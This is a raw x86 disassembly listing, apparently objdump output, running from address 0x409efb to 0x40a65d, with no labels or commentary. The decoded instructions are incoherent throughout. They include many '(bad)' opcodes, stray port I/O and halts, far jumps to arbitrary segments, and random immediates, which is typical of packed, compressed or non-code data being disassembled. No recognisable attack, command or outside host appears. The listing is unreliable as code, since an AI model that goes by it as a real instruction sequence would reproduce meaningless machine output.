  409efb:	in     al,0x8c
  409efd:	and    al,0x87
  409eff:	pop    edx
  409f00:	inc    edi
  409f01:	push   es
  409f02:	bound  esi,QWORD PTR [edx-0x23]
  409f05:	dec    ebx
  409f06:	test   eax,0x15ec089d
  409f0b:	mov    ebp,DWORD PTR [eax]
  409f0d:	lds    eax,FWORD PTR [esi]
  409f0f:	dec    ecx
  409f10:	push   0x49
  409f12:	mov    ?,WORD PTR [ecx+0x75]
  409f15:	jb     0x409e99
  409f17:	jns    0x409f4f
  409f19:	mov    ecx,0x17cbd944
  409f1e:	xchg   DWORD PTR [edx-0x73],ecx
  409f21:	ret    
  409f22:	adc    DWORD PTR [edx-0x15],eax
  409f25:	or     cl,BYTE PTR [eax]
  409f27:	cs inc eax
  409f29:	ret    0xbefa
  409f2c:	add    BYTE PTR [ebx],al
  409f2e:	mov    ds:0x483ee34c,eax
  409f33:	pusha  
  409f34:	sub    DWORD PTR [esi-0x45],esi
  409f37:	and    DWORD PTR [edx-0x2aac2f57],eax
  409f3d:	and    BYTE PTR [eax],bl
  409f3f:	out    dx,al
  409f40:	xchg   ecx,eax
  409f41:	aad    0xf3
  409f43:	lods   al,BYTE PTR ds:[esi]
  409f44:	mov    bh,BYTE PTR [eax+0x4b]
  409f47:	test   BYTE PTR [eax-0x75],ah
  409f4a:	out    dx,al
  409f4b:	inc    ebp
  409f4c:	aam    0xb
  409f4e:	jp     0x409ed9
  409f50:	mov    dl,0xc0
  409f52:	dec    eax
  409f53:	mov    ebp,0x19596891
  409f58:	jne    0x409f57
  409f5a:	add    edi,edi
  409f5c:	icebp  
  409f5d:	jmp    FWORD PTR [ebx-0x44]
  409f60:	das    
  409f61:	lock mov dh,0x94
  409f64:	xor    BYTE PTR [edx],0xf3
  409f67:	inc    ecx
  409f68:	lea    ebx,[edx]
  409f6a:	pop    ebp
  409f6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f6c:	xor    BYTE PTR [eax],ch
  409f6e:	add    DWORD PTR [ebp+0x67],edx
  409f71:	cld    
  409f72:	dec    ebp
  409f73:	and    ecx,DWORD PTR [ebx+ebp*2]
  409f76:	jb     0x409fb7
  409f78:	xor    BYTE PTR [esi-0x16],bh
  409f7b:	rcl    edx,cl
  409f7d:	rcr    DWORD PTR [ecx-0x2a],cl
  409f80:	xor    al,0xac
  409f82:	stos   DWORD PTR es:[edi],eax
  409f83:	shl    DWORD PTR [edx],0x7e
  409f86:	push   edi
  409f87:	ror    bh,0xd3
  409f8a:	ss pop ds
  409f8c:	sbb    ebp,esp
  409f8e:	mov    ah,0x94
  409f90:	div    ah
  409f92:	and    eax,0xd19ef6ab
  409f97:	loope  0x409fca
  409f99:	iret   
  409f9a:	mov    eax,0x7a63c5e0
  409f9f:	outs   dx,DWORD PTR ds:[esi]
  409fa0:	repnz push edx
  409fa2:	(bad)  
  409fa3:	rol    DWORD PTR [edi+0x45d69f3],1
  409fa9:	sub    al,al
  409fab:	into   
  409fac:	mov    DWORD PTR [ebx],0x64b42cfe
  409fb2:	jns    0x40a00c
  409fb4:	sub    dl,BYTE PTR [ecx+0x12]
  409fb7:	sub    eax,0xd9f29724
  409fbc:	cwde   
  409fbd:	ja     0x409fea
  409fbf:	and    BYTE PTR [esi],cl
  409fc1:	and    ebp,ebp
  409fc3:	fldenv [ebp-0x4c7f33aa]
  409fc9:	adc    BYTE PTR [esi+0x2c783293],ah
  409fcf:	pop    ecx
  409fd0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409fd1:	xor    DWORD PTR [esi+esi*8+0x14726cfc],ecx
  409fd8:	test   eax,0xaa73d754
  409fdd:	jo     0x409fd5
  409fdf:	in     al,dx
  409fe0:	or     esi,DWORD PTR [eax-0x19]
  409fe3:	icebp  
  409fe4:	mov    ecx,esp
  409fe6:	sbb    al,0x36
  409fe8:	pop    ebx
  409fe9:	xor    al,BYTE PTR [edi]
  409feb:	push   esp
  409fec:	push   eax
  409fed:	cli    
  409fee:	call   0xb2e6:0x75c07677
  409ff5:	dec    eax
  409ff6:	(bad)  [edi]
  409ff8:	test   eax,0xfdb78167
  409ffd:	xchg   ecx,eax
  409ffe:	mov    edx,0x754ba59f
  40a003:	xchg   ebx,eax
  40a004:	std    
  40a005:	cwde   
  40a006:	and    edx,edi
  40a008:	push   eax
  40a009:	xor    cl,BYTE PTR [bp+si-0x4781]
  40a00e:	sbb    DWORD PTR [edi-0x1c],0xfffffffb
  40a012:	addr16 pop ebx
  40a014:	test   eax,0x497841e0
  40a019:	lock rcl DWORD PTR [ebx],0x1f
  40a01d:	pop    edi
  40a01e:	push   ecx
  40a01f:	call   DWORD PTR [eax]
  40a021:	sub    BYTE PTR [ebp-0x7a],al
  40a024:	retf   0x50b
  40a027:	push   eax
  40a028:	jae    0x409fb5
  40a02a:	mov    eax,ds:0x1475a6a3
  40a02f:	test   ebp,0x462222d0
  40a035:	(bad)  
  40a037:	std    
  40a038:	std    
  40a039:	push   0xc3f1b87e
  40a03e:	ins    DWORD PTR es:[edi],dx
  40a03f:	sub    al,0xb5
  40a041:	inc    ecx
  40a042:	rol    DWORD PTR [ecx],0x2
  40a045:	mov    WORD PTR [esp+edx*8+0x3b],?
  40a049:	sbb    ecx,eax
  40a04b:	dec    esp
  40a04c:	jno    0x409ffc
  40a04e:	mov    dh,0xa2
  40a050:	idiv   bl
  40a052:	jo     0x40a011
  40a054:	popa   
  40a055:	mov    BYTE PTR [edi],cl
  40a057:	je     0x40a08b
  40a059:	(bad)  
  40a05a:	fxch   st(2)
  40a05c:	mov    al,0xe5
  40a05e:	std    
  40a05f:	mov    al,ds:0x897af100
  40a064:	retf   0x5c95
  40a067:	mov    ebp,0x31e2dc3d
  40a06c:	fcmovbe st,st(6)
  40a06e:	aam    0xd
  40a070:	push   es
  40a071:	dec    ebp
  40a072:	ja     0x40a069
  40a074:	js     0x40a024
  40a076:	or     esi,DWORD PTR [edx-0x4a]
  40a079:	loope  0x40a0a5
  40a07b:	push   ss
  40a07c:	pop    esp
  40a07d:	push   0x4c
  40a07f:	loop   0x40a0ba
  40a081:	jo     0x40a01e
  40a083:	push   ebx
  40a084:	ja     0x40a0a8
  40a086:	mov    bh,0x63
  40a088:	pop    esp
  40a089:	es dec esp
  40a08b:	imul   esp,DWORD PTR [eax-0x7],0xdc338c7d
  40a092:	(bad)  
  40a093:	mov    eax,0x710d1bb
  40a098:	test   eax,0x56c54e19
  40a09d:	adc    esp,DWORD PTR [ecx-0x79]
  40a0a0:	adc    DWORD PTR [ebp+0x30f56bb9],esp
  40a0a6:	repnz loop 0x40a0cb
  40a0a9:	push   esp
  40a0aa:	sub    BYTE PTR [eax],0xc3
  40a0ad:	ficomp DWORD PTR [eax+eax*8]
  40a0b0:	cs jo  0x40a04e
  40a0b3:	mov    ss,edi
  40a0b5:	(bad)
  40a0b9:	test   DWORD PTR [eax],ebp
  40a0bb:	jmp    0x5348:0x98248ef3
  40a0c2:	sbb    DWORD PTR [ebx-0xc],ebp
  40a0c5:	xor    al,0xf4
  40a0c7:	adc    BYTE PTR [edx-0x21fd072f],0x58
  40a0ce:	imul   esp,DWORD PTR [esi-0x68],0x775e5c75
  40a0d5:	xchg   edi,eax
  40a0d6:	(bad)  
  40a0d7:	dec    esp
  40a0d8:	mov    eax,0x250fcc20
  40a0dd:	pop    eax
  40a0de:	mov    dh,0x70
  40a0e0:	shr    DWORD PTR [eax-0x68],cl
  40a0e3:	jne    0x40a0e1
  40a0e5:	sbb    BYTE PTR [ebx-0x3a],cl
  40a0e8:	jp     0x40a06f
  40a0ea:	fisubr WORD PTR [edx+ebx*1-0x5e734d5b]
  40a0f1:	out    dx,al
  40a0f2:	stos   BYTE PTR es:[edi],al
  40a0f3:	ror    DWORD PTR [edi],0x1d
  40a0f6:	loope  0x40a152
  40a0f8:	and    ecx,edx
  40a0fa:	loopne 0x40a07d
  40a0fc:	outs   dx,DWORD PTR ds:[esi]
  40a0fd:	dec    esp
  40a0fe:	push   eax
  40a0ff:	aam    0x6f
  40a101:	add    al,0xee
  40a103:	sti    
  40a104:	(bad)  
  40a105:	les    eax,FWORD PTR [ebp-0x5c]
  40a108:	dec    edx
  40a109:	cs call 0xe96f:0x40e48bba
  40a111:	lahf   
  40a112:	nop    DWORD PTR [eax-0x1d]
  40a116:	mov    esp,0x276d2f7b
  40a11b:	pusha  
  40a11c:	and    DWORD PTR [ecx+0x2cfb81b5],ebp
  40a122:	pop    ecx
  40a123:	cmp    DWORD PTR [ebx-0x4e],esi
  40a126:	inc    ebx
  40a127:	mov    ds:0xf0ae2dd,eax
  40a12c:	cmp    DWORD PTR [eax+0x78],ecx
  40a12f:	in     al,0x83
  40a131:	mov    ebp,0xffb038d6
  40a136:	je     0x40a126
  40a138:	pop    es
  40a139:	arpl   WORD PTR [esi+0x51],cx
  40a13c:	(bad)  
  40a13d:	adc    BYTE PTR [ecx-0x46fbff9],dh
  40a143:	sbb    BYTE PTR [edi-0x57],dh
  40a146:	sub    edi,DWORD PTR [ebp+ebp*4+0x6f]
  40a14a:	loop   0x40a0d0
  40a14c:	test   bh,0xe8
  40a14f:	cs popa 
  40a151:	stc    
  40a152:	enter  0x649e,0xd0
  40a156:	sub    eax,0x2c122133
  40a15b:	xor    ebx,DWORD PTR [esi]
  40a15d:	stos   DWORD PTR es:[edi],eax
  40a15e:	inc    edx
  40a15f:	add    edi,DWORD PTR [ebp-0x2c4a05a6]
  40a165:	xchg   ebx,eax
  40a166:	fist   DWORD PTR [edx+0x493fd736]
  40a16c:	xchg   DWORD PTR [edx],ebx
  40a16e:	aaa    
  40a16f:	daa    
  40a170:	sahf   
  40a171:	push   edi
  40a172:	and    ebp,edx
  40a174:	add    BYTE PTR [ecx+ecx*8-0x52],cl
  40a178:	pop    ds
  40a179:	shl    DWORD PTR [ebp-0x445d694b],cl
  40a17f:	icebp  
  40a180:	jmp    DWORD PTR [ebx-0x57]
  40a183:	int3   
  40a184:	repz adc BYTE PTR [edx+ecx*8-0x74],ah
  40a189:	rol    DWORD PTR ds:0xe333681f,0x3f
  40a190:	fs mov dh,0x1e
  40a193:	mov    al,ds:0xbed5cc4a
  40a198:	mov    edi,0xdba22323
  40a19d:	sub    dl,ah
  40a19f:	pslld  mm0,mm2
  40a1a2:	and    DWORD PTR [eax+0x5c],esp
  40a1a5:	retf   
  40a1a6:	arpl   WORD PTR [edi-0x1e],di
  40a1a9:	dec    esi
  40a1aa:	pushf  
  40a1ab:	stos   BYTE PTR es:[edi],al
  40a1ac:	lods   al,BYTE PTR ds:[esi]
  40a1ad:	jbe    0x40a19a
  40a1af:	jo     0x40a228
  40a1b1:	fiadd  WORD PTR [eax]
  40a1b3:	dec    ecx
  40a1b4:	das    
  40a1b5:	adc    esp,DWORD PTR [eax]
  40a1b7:	mov    edi,0xc31703bd
  40a1bc:	mov    eax,ds:0x9508b92b
  40a1c1:	jno    0x40a21f
  40a1c3:	mov    al,ds:0x3d978c10
  40a1c8:	(bad)  
  40a1c9:	push   ecx
  40a1ca:	and    DWORD PTR [ebx-0x33],ebx
  40a1cd:	les    eax,FWORD PTR [edx]
  40a1cf:	inc    ebx
  40a1d0:	aas    
  40a1d1:	cwde   
  40a1d2:	das    
  40a1d3:	mov    BYTE PTR [ebp-0x12],ch
  40a1d6:	aam    0x92
  40a1d8:	scas   al,BYTE PTR es:[edi]
  40a1d9:	push   eax
  40a1da:	imul   ebx,DWORD PTR [edx-0x25],0x8552ed76
  40a1e1:	mov    esi,0x6ddccbe4
  40a1e6:	lods   eax,DWORD PTR ds:[esi]
  40a1e7:	ficom  WORD PTR [edx]
  40a1e9:	cs mov cl,0x8e
  40a1ec:	dec    ebx
  40a1ed:	test   eax,0xe372294c
  40a1f2:	jmp    DWORD PTR [ebx]
  40a1f4:	or     eax,0x182b062b
  40a1f9:	dec    eax
  40a1fa:	add    ch,BYTE PTR [edi-0x346ed9f]
  40a200:	or     bh,0x7f
  40a203:	mov    ds:0x79995a19,eax
  40a208:	mov    ecx,0x96f0c745
  40a20d:	and    edi,DWORD PTR [eax+0x77db03e2]
  40a213:	addr16 call 0x8879:0x71232c2b
  40a21b:	or     edx,DWORD PTR [edx+0x3a]
  40a21e:	das    
  40a21f:	fdiv   QWORD PTR [ebx]
  40a221:	(bad)  
  40a222:	in     eax,dx
  40a223:	inc    esp
  40a224:	and    edx,DWORD PTR [edi]
  40a226:	xchg   edx,eax
  40a227:	jo     0x40a219
  40a229:	mov    eax,ebx
  40a22b:	push   ecx
  40a22c:	push   esi
  40a22d:	inc    BYTE PTR [eax+0x1]
  40a230:	jns    0x40a23a
  40a232:	mov    ah,0x3d
  40a234:	dec    edi
  40a235:	cli    
  40a236:	mov    BYTE PTR [ecx-0x5f0d54a],ch
  40a23c:	add    al,0x25
  40a23e:	and    eax,0xfeb2ce1e
  40a243:	or     eax,0x86d8cde8
  40a248:	popf   
  40a249:	mov    al,0x6
  40a24b:	mov    ebx,0x5a115bfa
  40a250:	(bad)
  40a253:	int3   
  40a254:	mov    bh,0xe4
  40a256:	test   al,0xed
  40a258:	daa    
  40a259:	jmp    0x40a2d0
  40a25b:	sbb    al,0xe0
  40a25d:	in     al,0x44
  40a25f:	rol    DWORD PTR [edi+0x7c],0xe1
  40a263:	dec    ecx
  40a264:	and    eax,DWORD PTR [edx-0x5c]
  40a267:	mov    edi,0xe9e4944d
  40a26c:	mov    esp,0x15cca797
  40a271:	ret    
  40a272:	add    al,0x24
  40a274:	das    
  40a275:	cmp    BYTE PTR [ebp-0x41d1dd0e],ch
  40a27b:	test   ah,bh
  40a27d:	dec    ebx
  40a27e:	mov    DWORD PTR [edi],0xdaed4884
  40a284:	xchg   ebp,eax
  40a285:	pop    ecx
  40a286:	test   BYTE PTR [ebx+esi*2+0x76d09704],cl
  40a28d:	les    edi,FWORD PTR [eax]
  40a28f:	scas   eax,DWORD PTR es:[edi]
  40a290:	push   esp
  40a291:	xchg   esp,eax
  40a292:	shr    DWORD PTR [esi+0x5],cl
  40a295:	mov    gs,WORD PTR [ecx+0x77db4350]
  40a29b:	pusha  
  40a29c:	jo     0x40a31c
  40a29e:	mov    esp,edx
  40a2a0:	or     DWORD PTR [eax-0x26],ebp
  40a2a3:	push   ss
  40a2a4:	mov    ebx,0x87110c8f
  40a2a9:	cmp    esi,eax
  40a2ab:	jno    0x40a2e9
  40a2ad:	inc    eax
  40a2ae:	mov    BYTE PTR [ecx],bh
  40a2b0:	cli    
  40a2b1:	xor    BYTE PTR [ecx-0x5e],0xac
  40a2b5:	hlt    
  40a2b6:	fs pop es
  40a2b8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2b9:	jne    0x40a326
  40a2bb:	sub    BYTE PTR [ebp-0x20b1cc42],bh
  40a2c1:	ret    
  40a2c2:	je     0x40a285
  40a2c4:	jmp    0x3002:0xb0c3366
  40a2cb:	outs   dx,DWORD PTR ds:[esi]
  40a2cc:	push   0xffffffa4
  40a2ce:	jno    0x40a25c
  40a2d0:	or     eax,edx
  40a2d2:	pop    edx
  40a2d3:	mov    es,WORD PTR [eax-0x77f61557]
  40a2d9:	inc    eax
  40a2da:	jg     0x40a349
  40a2dc:	pop    ebx
  40a2dd:	mov    dl,0x5b
  40a2df:	xchg   ebx,eax
  40a2e0:	arpl   WORD PTR [ecx+0x4d],bx
  40a2e3:	mov    al,ds:0x21ad1aa8
  40a2e8:	mov    esp,0x4c5e43b2
  40a2ed:	jmp    0x1313e25a
  40a2f2:	sub    BYTE PTR [eax-0x5e],0xcb
  40a2f6:	and    cl,dl
  40a2f8:	inc    esp
  40a2f9:	jge    0x40a289
  40a2fb:	dec    edx
  40a2fc:	xor    BYTE PTR [ebp-0x52],0x14
  40a300:	xlat   BYTE PTR ds:[ebx]
  40a301:	repz or ebp,DWORD PTR [eax]
  40a304:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a305:	add    al,0x40
  40a307:	push   ss
  40a308:	xor    DWORD PTR [ebp+0x5e],esi
  40a30b:	push   edx
  40a30c:	daa    
  40a30d:	stc    
  40a30e:	pusha  
  40a30f:	and    al,0x7a
  40a311:	dec    ebp
  40a312:	fcmovnu st,st(7)
  40a314:	fnsave [ecx+0x71]
  40a317:	push   0x9522969c
  40a31c:	jnp    0x40a374
  40a31e:	ret    0xb4fc
  40a321:	xor    DWORD PTR [edx-0x10],ebp
  40a324:	(bad)  
  40a325:	xor    edx,DWORD PTR [edi]
  40a327:	les    edi,FWORD PTR [ebp+0x31cc2d08]
  40a32d:	scas   al,BYTE PTR es:[edi]
  40a32e:	dec    esi
  40a32f:	xchg   esi,eax
  40a330:	ins    DWORD PTR es:[edi],dx
  40a331:	gs addr16 sar edi,cl
  40a335:	xchg   edx,eax
  40a336:	adc    ah,0x2f
  40a339:	add    al,0x5c
  40a33b:	std    
  40a33c:	mov    dl,0x23
  40a33e:	inc    esi
  40a33f:	and    BYTE PTR [esi],bh
  40a341:	out    0xe9,eax
  40a343:	cmp    ch,BYTE PTR [eax+0xc]
  40a346:	(bad)  
  40a347:	(bad)  
  40a349:	or     DWORD PTR [edx+0x4c],edi
  40a34c:	dec    eax
  40a34d:	dec    edx
  40a34e:	shr    dl,cl
  40a350:	lea    edi,[edx+0x2c]
  40a353:	repz pushf 
  40a355:	sub    ch,BYTE PTR [eax-0x9]
  40a358:	inc    edx
  40a359:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a35b:	arpl   WORD PTR [ecx+0x717accc],ax
  40a361:	mov    gs,WORD PTR [esi]
  40a363:	sub    DWORD PTR [eax],ebx
  40a365:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a366:	ror    DWORD PTR [edi],cl
  40a368:	push   edx
  40a369:	mul    DWORD PTR [edi+0x23]
  40a36c:	jo     0x40a39f
  40a36e:	dec    edi
  40a36f:	int    0x93
  40a371:	pusha  
  40a372:	das    
  40a373:	repnz inc eax
  40a375:	shl    ebx,cl
  40a377:	push   ebp
  40a378:	es hlt 
  40a37a:	push   edx
  40a37b:	dec    edi
  40a37c:	push   es
  40a37d:	push   eax
  40a37e:	dec    ecx
  40a37f:	dec    ecx
  40a380:	cmp    bl,dh
  40a382:	(bad)  
  40a383:	nop
  40a384:	int    0x56
  40a386:	push   0xc5d01ab7
  40a38b:	and    DWORD PTR [edi+0x48],esp
  40a38e:	add    dl,BYTE PTR [esi]
  40a390:	xchg   BYTE PTR [edx+0x352aa0c1],cl
  40a396:	div    BYTE PTR [ebp+0x31]
  40a399:	in     eax,dx
  40a39a:	jecxz  0x40a38e
  40a39c:	xor    eax,0x674cdb1a
  40a3a1:	nop
  40a3a2:	mov    eax,ds:0x71b11ee
  40a3a7:	idiv   edi
  40a3a9:	ja     0x40a32c
  40a3ab:	fs sub bl,ah
  40a3ae:	sbb    eax,0x53f7f615
  40a3b3:	sub    al,0x59
  40a3b5:	ins    DWORD PTR es:[edi],dx
  40a3b6:	loopne 0x40a3cc
  40a3b8:	in     eax,dx
  40a3b9:	test   DWORD PTR [esi],0xc944b44f
  40a3bf:	in     eax,dx
  40a3c0:	out    0xdf,eax
  40a3c2:	mov    ebp,0xf2adf923
  40a3c7:	xchg   esi,eax
  40a3c8:	stos   DWORD PTR es:[edi],eax
  40a3c9:	dec    eax
  40a3ca:	sbb    dh,bh
  40a3cc:	loope  0x40a3f4
  40a3ce:	mov    dl,0xe8
  40a3d0:	sub    eax,0xcb9b88ff
  40a3d5:	mov    ch,0x3c
  40a3d7:	sbb    BYTE PTR [ebx],ch
  40a3d9:	stos   BYTE PTR es:[edi],al
  40a3da:	fnsave [eax-0x7c5644c5]
  40a3e0:	cli    
  40a3e1:	mov    ?,WORD PTR [eax]
  40a3e3:	lods   eax,DWORD PTR ds:[esi]
  40a3e4:	dec    esp
  40a3e5:	cdq    
  40a3e6:	add    DWORD PTR [edx+esi*2+0x37baae1],edx
  40a3ed:	loope  0x40a44d
  40a3ef:	enter  0xb244,0xaa
  40a3f3:	ins    BYTE PTR es:[edi],dx
  40a3f4:	dec    ecx
  40a3f5:	mov    ecx,0xf2dc9f31
  40a3fa:	add    bl,BYTE PTR [ebx-0x3b]
  40a3fd:	(bad)  
  40a3ff:	retf   
  40a400:	gs dec ecx
  40a402:	(bad)  
  40a403:	cwde   
  40a404:	or     DWORD PTR [edx+ebx*1+0x1d583d17],ebx
  40a40b:	add    DWORD PTR [edx+0x2b],esp
  40a40e:	sbb    BYTE PTR [ecx],dl
  40a410:	(bad)  
  40a412:	pop    ecx
  40a413:	inc    ebp
  40a414:	fdecstp 
  40a416:	(bad)  
  40a417:	push   edi
  40a418:	pop    edi
  40a419:	ficomp DWORD PTR ds:0x87881417
  40a41f:	xor    ebx,DWORD PTR [esi+0x66]
  40a422:	(bad)  
  40a424:	jg     0x40a3fd
  40a426:	xchg   BYTE PTR [esi+0x4c7ba869],ch
  40a42c:	cs push ebp
  40a42e:	out    0x52,al
  40a430:	stos   BYTE PTR es:[edi],al
  40a431:	repz (bad) 
  40a433:	cmp    bl,dh
  40a435:	(bad)  
  40a436:	sbb    BYTE PTR [edi],cl
  40a438:	test   DWORD PTR [esi+0x249bff4f],ecx
  40a43e:	out    dx,al
  40a43f:	jp     0x40a3ce
  40a441:	dec    edx
  40a442:	push   edx
  40a443:	call   FWORD PTR [eax+ebp*2-0xf8510bd]
  40a44a:	or     al,0x38
  40a44c:	sbb    BYTE PTR [ebx+0x49],cl
  40a44f:	popf   
  40a450:	push   esp
  40a451:	outs   dx,BYTE PTR ds:[esi]
  40a452:	outs   dx,DWORD PTR ds:[esi]
  40a453:	in     eax,dx
  40a454:	(bad)  
  40a455:	push   esp
  40a456:	ret    0xc04b
  40a459:	ret    0xb3db
  40a45c:	adc    ebx,ecx
  40a45e:	adc    DWORD PTR [ecx+0x133449f7],0xa62952ab
  40a468:	adc    BYTE PTR [esi-0x3c],dh
  40a46b:	push   ebx
  40a46c:	retf   0x86ee
  40a46f:	sub    al,0x5f
  40a471:	xor    dl,BYTE PTR [eax-0x44]
  40a474:	into   
  40a475:	and    al,BYTE PTR ds:0x71b9857a
  40a47b:	jmp    0x7750:0x2a90e4d5
  40a482:	pop    ebp
  40a483:	dec    ecx
  40a484:	sahf   
  40a485:	ficom  DWORD PTR [esi-0x79]
  40a488:	jo     0x40a460
  40a48a:	sbb    cl,BYTE PTR [eax+esi*8-0x4121e72a]
  40a491:	enter  0x255f,0x9f
  40a495:	es popf 
  40a497:	or     eax,0xb222587f
  40a49c:	adc    eax,0xe0ab7a2c
  40a4a1:	inc    ebx
  40a4a2:	sub    ebx,DWORD PTR [esi]
  40a4a4:	dec    ecx
  40a4a5:	test   BYTE PTR [ecx-0x19],dl
  40a4a8:	dec    edi
  40a4a9:	in     eax,dx
  40a4aa:	enter  0xc507,0x72
  40a4ae:	push   ss
  40a4af:	cmp    eax,0x7f041206
  40a4b4:	clc    
  40a4b5:	add    bh,dh
  40a4b7:	outs   dx,BYTE PTR ds:[esi]
  40a4b8:	adc    eax,0xd4465786
  40a4bd:	int    0x5f
  40a4bf:	fstp   TBYTE PTR [ebp-0x40]
  40a4c2:	mov    dl,0x5
  40a4c4:	mov    edi,DWORD PTR [ebp+0x39]
  40a4c7:	xor    al,0x14
  40a4c9:	add    esi,DWORD PTR [eax-0x71]
  40a4cc:	ffreep st(0)
  40a4ce:	dec    esi
  40a4cf:	shr    al,1
  40a4d1:	repnz add ah,cl
  40a4d4:	pop    esp
  40a4d5:	mov    dl,0x28
  40a4d7:	aam    0x1
  40a4d9:	(bad)  [ebx-0x4c]
  40a4dc:	inc    edi
  40a4dd:	sub    dl,BYTE PTR [eax]
  40a4df:	(bad)  
  40a4e0:	or     BYTE PTR [eax+0x1f],al
  40a4e3:	xchg   DWORD PTR [edx-0x7f8c960c],edx
  40a4e9:	shr    DWORD PTR [ebp-0x3411ffa],1
  40a4ef:	in     eax,0x44
  40a4f1:	push   es
  40a4f2:	retf   0xcb00
  40a4f5:	cmp    al,0x19
  40a4f7:	stos   DWORD PTR es:[edi],eax
  40a4f8:	mov    esi,0xd9b329dc
  40a4fd:	xchg   ebx,eax
  40a4fe:	neg    DWORD PTR [ebx-0x7a]
  40a501:	in     eax,0xdb
  40a503:	call   0xf90:0x44d1845c
  40a50a:	inc    eax
  40a50b:	pop    ebp
  40a50c:	jae    0x40a492
  40a50e:	scas   al,BYTE PTR es:[edi]
  40a50f:	cli    
  40a510:	add    BYTE PTR [eax+eiz*8-0xa],al
  40a514:	fnstenv [ecx-0x7da9143e]
  40a51a:	loop   0x40a4aa
  40a51c:	(bad)  
  40a51d:	test   BYTE PTR [esi-0x5f595ee3],0xc2
  40a524:	ffree  st(2)
  40a526:	add    esi,DWORD PTR [edi]
  40a528:	into   
  40a529:	mov    ds:0x3806c0ee,eax
  40a52e:	mov    ebp,0x9b774171
  40a533:	or     bh,cl
  40a535:	mov    ds:0x8712e186,eax
  40a53a:	loopne 0x40a597
  40a53c:	pushf  
  40a53d:	pop    es
  40a53e:	sbb    ecx,DWORD PTR [edx+0x5c]
  40a541:	scas   al,BYTE PTR es:[edi]
  40a542:	push   ebx
  40a543:	xchg   BYTE PTR [ecx],ch
  40a545:	lock retf 0xd5
  40a549:	push   ebp
  40a54a:	cwde   
  40a54b:	in     eax,0x2e
  40a54d:	mov    ebp,0xaa858731
  40a552:	jmp    0x584e:0x3a958d0b
  40a559:	adc    ebp,DWORD PTR [edx+0x68f27402]
  40a55f:	scas   eax,DWORD PTR es:[edi]
  40a560:	or     dh,BYTE PTR [eax-0x53]
  40a563:	add    edx,esi
  40a565:	mov    dh,0xb2
  40a567:	push   cs
  40a568:	jbe    0x40a5e4
  40a56a:	mov    DWORD PTR [ebx+0x52],ebp
  40a56d:	sahf   
  40a56e:	jmp    0x6ecc8895
  40a573:	adc    BYTE PTR [ebx],cl
  40a575:	pop    edx
  40a576:	jnp    0x40a52e
  40a578:	and    BYTE PTR [eax-0x7d],cl
  40a57b:	mov    esi,0xd909fe75
  40a580:	mov    al,ds:0xf9a1b4ed
  40a585:	pop    ebp
  40a586:	push   ecx
  40a587:	xchg   edx,eax
  40a588:	push   ebp
  40a589:	dec    ecx
  40a58a:	call   0xd44220ef
  40a58f:	inc    eax
  40a590:	inc    edi
  40a591:	aad    0xc
  40a593:	or     al,0x3
  40a595:	faddp  st(3),st
  40a597:	mov    ds,WORD PTR [edx-0x302b1696]
  40a59d:	or     BYTE PTR ds:0x5d2109c,ch
  40a5a3:	mov    bl,0xd
  40a5a5:	outs   dx,BYTE PTR ds:[esi]
  40a5a6:	sub    eax,0x48687578
  40a5ab:	xor    DWORD PTR [edi+0x4b],edx
  40a5ae:	shl    DWORD PTR ds:0xf0a54452,0x76
  40a5b5:	lahf   
  40a5b6:	dec    ecx
  40a5b7:	test   DWORD PTR [esi-0x4d],ebp
  40a5ba:	jns    0x40a5a7
  40a5bc:	xor    al,0x6c
  40a5be:	sub    DWORD PTR [edx+0x28422ac9],ecx
  40a5c4:	fs sub al,0xda
  40a5c7:	rcl    BYTE PTR [edx],0xf4
  40a5ca:	in     eax,0x15
  40a5cc:	jg     0x40a570
  40a5ce:	jmp    0x916378b7
  40a5d3:	aaa    
  40a5d4:	add    eax,0xc19cea3e
  40a5d9:	xor    al,0xf4
  40a5db:	(bad)  
  40a5dc:	lds    ebp,FWORD PTR [esp+ebp*8]
  40a5df:	dec    ecx
  40a5e0:	cwde   
  40a5e1:	add    al,0x61
  40a5e3:	inc    esi
  40a5e4:	fnstsw WORD PTR ds:0xdfd3bcd3
  40a5ea:	shl    ch,cl
  40a5ec:	popa   
  40a5ed:	sub    al,0x9b
  40a5ef:	cld    
  40a5f0:	mov    cl,0xe2
  40a5f2:	mov    esi,0x59b5c033
  40a5f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a5f8:	lods   al,BYTE PTR ds:[esi]
  40a5f9:	ins    BYTE PTR es:[edi],dx
  40a5fa:	idiv   DWORD PTR [eax]
  40a5fc:	or     BYTE PTR [edi+ecx*8+0x74],cl
  40a600:	pop    eax
  40a601:	pop    ecx
  40a602:	lahf   
  40a603:	loope  0x40a5c5
  40a605:	adc    eax,eax
  40a607:	push   esp
  40a608:	inc    edx
  40a609:	fbstp  TBYTE PTR ds:0x7a838816
  40a60f:	(bad)  
  40a610:	xor    dh,dh
  40a612:	icebp  
  40a613:	ret    
  40a614:	fwait
  40a615:	das    
  40a616:	mov    BYTE PTR [eax],dl
  40a618:	outs   dx,BYTE PTR ds:[esi]
  40a619:	xchg   ecx,eax
  40a61a:	lahf   
  40a61b:	add    eax,0xfddbcb1c
  40a620:	sub    al,0x41
  40a622:	call   0xa4997b07
  40a627:	scas   al,BYTE PTR es:[edi]
  40a628:	xchg   ebp,eax
  40a629:	int3   
  40a62a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a62b:	xor    esp,ebx
  40a62d:	and    eax,0x6cd082a3
  40a632:	dec    esp
  40a633:	repnz out dx,al
  40a635:	call   0x6317f7b5
  40a63a:	jle    0x40a68f
  40a63c:	lds    ebx,FWORD PTR [edi+0x4abedcb3]
  40a642:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a643:	lsl    ebp,WORD PTR [ecx-0x58]
  40a647:	ins    BYTE PTR es:[edi],dx
  40a648:	jnp    0x40a6ba
  40a64a:	xchg   edx,eax
  40a64b:	mov    eax,0x2fe229a0
  40a650:	rol    DWORD PTR [ebp+0x17],cl
  40a653:	loope  0x40a605
  40a655:	rcr    DWORD PTR [edx+edx*8-0x4],0x25
  40a65a:	(bad)  
  40a65b:	out    0xb7,eax
  40a65d:	and    BYTE PTR [ebx+0x3dcf660a],ch
